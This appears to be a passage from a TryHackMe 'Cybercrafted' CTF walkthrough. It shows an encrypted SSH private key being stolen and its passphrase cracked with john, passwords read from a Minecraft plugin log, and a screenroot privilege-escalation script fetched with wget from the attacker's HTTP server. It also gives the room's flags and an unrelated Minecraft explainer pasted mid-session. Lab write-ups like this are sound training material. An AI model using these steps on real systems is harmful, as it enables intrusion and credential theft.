2021-06-27 15:11:52,659 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 15:18:13,144 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 15:18:13,144 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 16:47:11,668 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 16:47:11,668 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 17:14:01,080 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 17:14:01,081 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 17:49:33,899 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 17:49:33,899 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 17:55:01,055 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 17:55:01,055 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-28 09:51:49,259 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-28 09:51:49,259 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-28 18:45:23,025 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-28 18:45:23,025 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 09:29:28,022 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 09:29:28,022 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 11:48:56,333 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 11:48:56,333 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 11:53:50,604 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 11:53:50,604 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 12:01:30,550 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 12:01:30,550 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 12:07:43,416 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 12:07:43,416 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 13:08:30,175 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 13:08:30,175 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 13:43:30,354 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 13:43:30,355 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 14:34:44,684 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 14:34:44,684 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 15:21:27,141 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 15:21:27,141 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 15:26:29,979 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 15:26:29,979 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-04 15:49:04,183 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-04 15:49:04,183 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-06 09:44:12,448 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-06 09:44:12,448 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-06 09:45:39,717 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-06 09:45:39,717 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-06 09:48:45,363 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-06 09:48:45,363 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-15 17:13:34,113 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-15 17:13:34,113 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-15 20:36:15,487 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-15 20:36:15,487 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 

we found a private key :)

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6
Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----

let's save it

┌──(witty㉿kali)-[/tmp]
└─$ nano id_rsa_minecr
                                                                  

┌──(witty㉿kali)-[~/Downloads]
└─$ cat id_rsa_minecr 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----


┌──(witty㉿kali)-[/tmp]
└─$ chmod 600 id_rsa_minecr      
                                                                                 
┌──(witty㉿kali)-[/tmp]
└─$ ssh -i id_rsa_minecr xxultimatecreeperxx@10.10.88.215
The authenticity of host '10.10.88.215 (10.10.88.215)' can't be established.
ED25519 key fingerprint is SHA256:ebA122u0ERUidN6lFg44jNzp3OoM/U4Fi4usT3C7+GM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.88.215' (ED25519) to the list of known hosts.
Load key "id_rsa": error in libcrypto
xxultimatecreeperxx@10.10.88.215's password: 
Permission denied, please try again.
xxultimatecreeperxx@10.10.88.215's password: 

need to crack it

                                                                                 
┌──(witty㉿kali)-[/tmp]
└─$ ssh2john id_rsa_minecr > id_hash                     
                                                                                 
┌──(witty㉿kali)-[/tmp]
└─$ cat id_hash 
id_rsa:$sshng$1$16$3579498908433674083EAAD00F2D89F6$1200$49cdc53db0afff80c8a5050e6a5b1cccd915091fa105da2200433c9ad6c5d91c60a2257b5c5d8f8047a1c095218720c6f816ffb92882d40b0bf943bc5a00ec6d2b01c0a2d68a39980a6b29d5f5a9df16865f6a9555b988e39721f1e7f7410d5448273b4e6589808fc1b7a93d27ad163538668ca7584ee68bca639526389a8e1a3bf7d067010584f3d8ce2f0137540e6649f732b4d2099071d047aecadb3d9fd27a028768d590cd2cc7c412fa150178d593ea5af7a44a0128f9390644606e902e95290df946ebab6ffe0c0d5efcb07dbbdba7c22fb351e7351b9bada9f98d3c81d8c81d991d6a57f037b2ab98a65b01fd164a9f9cddc9a57216db64ce30f60e38a0236a7dd7a6296138685b65fe53533d12b599907e8ce9e56394fc9e6a053b50b171b8c925c258612ae4cb63db08dd98e0488db9955115a495bb0df91e94898781139215880f6c4133d77189df0cd3e6b2d076ba432b9e620d3aed14dabac716a3b034a10b9b34abed499dc621c258734e4b31f88d8974ce3588ecd6684cb340784db5e0f52622188290d5a07329b0849e694eae6d520dce51eabab120dbbd4f21084ea38eae7ecd896ab3e0e4216daf55e6959db0368628faf641908bf001b52f4faef4438ffa1220ee1833264886f9c7fa68828cd50dc55b87d64dcb943ffa2e4bee811db05c6d9155d18d230ae1b64cfc6f9c5a52f2d8e009ffae02699fc8180e32098faeae290b398ac7731d295f8ce8e1e6a911c8a6057cf7a02b7da20df783dc5df5e0bdca05a0254a4b4f2a943ea28a94b536be327821dc22fc26938e1e2eaa936e1ca43531ebcb12b7bc08cdd4b0c985b803f874bf19d94ac53a90502a476f3fea98d3847a10d228dd2a0a4ef308ffbb6f69c90ca98a542858ee762a2b38233b8c37a39df91f0be119c25776c1478a690c09d6dc00cfdf5d856a347e0d00071ed7e9409607f76a21a63ddd1799894d3f9a2fc31f021494175d8c9e7f5df4c12e191288c07585e1dd4aebd96bd06a5148ec43ac069f3677d9a3290e3d18d9b2cc0add85f016edf1590165de667b37eeb20ce493a49809b8d7e22748e130130c878fabecc7043a19787f88ddd0f1cf7f74ddc5a38dcc7b40a23ebd2580c8af1c09dbc0ed56eca4f3da6ed9b63b9a96dc40572c6075efe84be1fdebe4486b28adc287bf5523dc109c84be95e266667897e775ee8490834dc115bcbc363e80862a03faf641b28e74bc870fec4fe12a57ed55459625d75bd0c3a9d7cb27a82530d34d6ccd661331c1332c1dd48284666fbb8a1faae2cd1104296c5742109f30ab4a28ffff8bab00de596841dfd24ebde5f60028cb38d7f6d0fd3bfb92f35c4fddd0263a6147048a772408bae0ec8c202807b56e308e210ab11ab936af5d4f36966a357002de35282fbe1c7171deebd5e822cb2bc7cd4b4e50fdd170e6b1bc7c18190c46cb592af3ca14684ec9ad5da24870504f2e8d90257d8f6465b066587d8187b9fea3b8e73751bd620d5d41e06934f7ae2f72578fa06fab74c5d62be1e67717cd1c3899c8de2d690801a7ae7a44a4cce3d23b32c743fee4caf42c8740613dab63de9258e48ddcc2af0716eb12e16082ebb9ac97d41e085aaaffa79e64bfafa38d01cecba6b4426db73b0ae12a13bc927d4e750316a9fb5fd83de112e04a47f1572c8ba08639b24758fd245b49
                                                                                 
┌──(witty㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
creepin2006      (id_rsa)     
1g 0:00:00:02 DONE (2023-03-08 15:08) 0.4854g/s 920403p/s 920403c/s 920403C/s creepygoblin..creek93
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads]
└─$ nano id_rsa_minecr  
                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 id_rsa_minecr 
                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -i id_rsa_minecr xxultimatecreeperxx@10.10.173.88
Enter passphrase for key 'id_rsa_minecr': 
xxultimatecreeperxx@cybercrafted:~$ whoami
xxultimatecreeperxx

xxultimatecreeperxx@cybercrafted:/home$ find / -name "*minecraft*" 2> /dev/null
/run/systemd/units/invocation:minecraft.service
/var/lib/lxcfs/cgroup/blkio/system.slice/minecraft.service
/var/lib/lxcfs/cgroup/pids/system.slice/minecraft.service
/var/lib/lxcfs/cgroup/devices/system.slice/minecraft.service
/var/lib/lxcfs/cgroup/memory/system.slice/minecraft.service
/var/lib/lxcfs/cgroup/cpu,cpuacct/system.slice/minecraft.service
/var/lib/lxcfs/cgroup/name=systemd/system.slice/minecraft.service
/sys/kernel/slab/:A-0005888/cgroup/task_struct(574:minecraft.service)
/sys/kernel/slab/:0000192/cgroup/kmalloc-192(574:minecraft.service)
/sys/kernel/slab/:A-0000192/cgroup/cred_jar(574:minecraft.service)
/sys/kernel/slab/:0001024/cgroup/kmalloc-1024(574:minecraft.service)
/sys/kernel/slab/:A-0001024/cgroup/signal_cache(574:minecraft.service)
/sys/kernel/slab/sock_inode_cache/cgroup/sock_inode_cache(574:minecraft.service)
/sys/kernel/slab/radix_tree_node/cgroup/radix_tree_node(574:minecraft.service)
/sys/kernel/slab/proc_inode_cache/cgroup/proc_inode_cache(574:minecraft.service)
/sys/kernel/slab/:A-0000064/cgroup/pid(574:minecraft.service)
/sys/kernel/slab/anon_vma/cgroup/anon_vma(574:minecraft.service)
/sys/kernel/slab/:A-0000704/cgroup/files_cache(574:minecraft.service)
/sys/kernel/slab/:A-0000072/cgroup/eventpoll_pwq(574:minecraft.service)
/sys/kernel/slab/:0000032/cgroup/kmalloc-32(574:minecraft.service)
/sys/kernel/slab/inode_cache/cgroup/inode_cache(574:minecraft.service)
/sys/kernel/slab/shmem_inode_cache/cgroup/shmem_inode_cache(574:minecraft.service)
/sys/kernel/slab/:A-0002112/cgroup/mm_struct(574:minecraft.service)
/sys/kernel/slab/sighand_cache/cgroup/sighand_cache(574:minecraft.service)
/sys/kernel/slab/:A-0000256/cgroup/filp(574:minecraft.service)
/sys/kernel/slab/:A-0000208/cgroup/vm_area_struct(574:minecraft.service)
/sys/kernel/slab/ext4_inode_cache/cgroup/ext4_inode_cache(574:minecraft.service)
/sys/kernel/slab/:aA-0000192/cgroup/dentry(574:minecraft.service)
/sys/kernel/slab/:A-0000128/cgroup/eventpoll_epi(574:minecraft.service)
/sys/fs/cgroup/blkio/system.slice/minecraft.service
/sys/fs/cgroup/pids/system.slice/minecraft.service
/sys/fs/cgroup/devices/system.slice/minecraft.service
/sys/fs/cgroup/memory/system.slice/minecraft.service
/sys/fs/cgroup/cpu,cpuacct/system.slice/minecraft.service
/sys/fs/cgroup/systemd/system.slice/minecraft.service
/sys/fs/cgroup/unified/system.slice/minecraft.service
/opt/minecraft
/opt/minecraft/minecraft_server_flag.txt
/etc/systemd/system/multi-user.target.wants/minecraft.service
/etc/systemd/system/minecraft.service

xxultimatecreeperxx@cybercrafted:/home$ cat /opt/minecraft/minecraft_server_flag.txt
THM{ba93767ae3db9f5b8399680040a0c99e}

xxultimatecreeperxx@cybercrafted:/home$ cd /opt/minecraft/
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls
cybercrafted  minecraft_server_flag.txt  note.txt  WorldBackup
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.

xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cd WorldBackup/
-bash: cd: WorldBackup/: Permission denied
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls
cybercrafted  minecraft_server_flag.txt  note.txt  WorldBackup
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cd cybercrafted/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ ls
banned-ips.txt      craftbukkit-1.7.2-server.jar  permissions.yml    white-list.txt
banned-players.txt  help.yml                      plugins            world
bukkit.yml          logs                          server-icon.png    world_nether
commands.yml        ops.txt                       server.properties  world_the_end
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cat ops.txt 
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cat white-list.txt 
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cd plugins/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls
LoginSystem  LoginSystem_v.2.4.jar
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cd LoginSystem/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
language.yml  log.txt  passwords.yml  settings.yml
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt  
[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123


[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!
[2023/03/08 20:39:47] [BUKKIT-SERVER] Startet LoginSystem!

xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ su cybercrafted
Password: JavaEdition>Bedrock

Java Edition and Bedrock are two different versions of Minecraft that are available for different platforms.

Java Edition is available for PC, Mac, and Linux and is the original version of Minecraft that was first released in 2009. It is often referred to as the "Java" version of Minecraft and is developed and published by Mojang Studios.

Bedrock Edition, on the other hand, is available for a variety of platforms, including Windows 10, Xbox One, Nintendo Switch, and mobile devices. It is a cross-platform version of Minecraft that allows players on different devices to play together. Bedrock Edition is developed and published by Mojang Studios, in partnership with Xbox Game Studios.

Both versions of Minecraft have their own unique features and gameplay mechanics, and the availability of certain mods, resource packs, and servers may differ between the two versions.

cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cd /home/cybercrafted/
cybercrafted@cybercrafted:~$ ls
user.txt
cybercrafted@cybercrafted:~$ cat user.txt 
THM{b4aa20aaf08f174473ab0325b24a45ca}

cybercrafted@cybercrafted:~$ sudo -l
[sudo] password for cybercrafted: 
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted

https://www.exploit-db.com/exploits/41154

cybercrafted@cybercrafted:~$ wget http://10.8.19.103:1234/screenroot.sh
--2023-03-08 21:19:14--  http://10.8.19.103:1234/screenroot.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1152 (1.1K) [text/x-sh]
Saving to: ‘screenroot.sh’

screenroot.sh                 100%[==============================================>]   1.12K  --.-KB/s    in 0s      

2023-03-08 21:19:14 (108 MB/s) - ‘screenroot.sh’ saved [1152/1152]

cybercrafted@cybercrafted:~$ chmod +x screenroot.sh
cybercrafted@cybercrafted:~$ ./screenroot.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’; did you mean ‘chroot’? [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^~~~~
     chroot
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     seteuid(0);
     ^~~~~~~
     setbuf
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^~~~~~
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
No Sockets found in /run/screen/S-cybercrafted.

$ whoami
cybercrafted
$ find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root        31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root        43K Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root   root        63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root        27K Sep 16  2020 /bin/umount
-rwsr-sr-x 1 daemon daemon      51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root        40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root        59K Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root        22K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root       146K Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root   root        19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root   messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       427K Aug 11  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root       116K Mar 26  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root        99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.173.88 - - [08/Mar/2023 16:19:13] "GET /screenroot.sh HTTP/1.1" 200 -

Nope

cybercrafted@cybercrafted:~$ sudo /usr/bin/screen -r cybercrafted
ctrl + a (create a window with a shell) , ctrl + c (switch window)
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{8bb1eda065ceefb5795a245568350a70}

or

downloading plugin 

https://github.com/Frazew/BukkitTTY

https://github.com/Frazew/BukkitTTY/releases/download/v0.0.2/BukkitTTY-0.0.2.jar

ctrl+a (released), d to close

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.173.88 - - [08/Mar/2023 16:38:01] "GET /BukkitTTY-0.0.2.jar HTTP/1.1" 200 -

cybercrafted@cybercrafted:~$ wget http://10.8.19.103:1234/BukkitTTY-0.0.2.jar
--2023-03-08 21:38:02--  http://10.8.19.103:1234/BukkitTTY-0.0.2.jar
Connecting to 10.8.19.103:1234... connected.
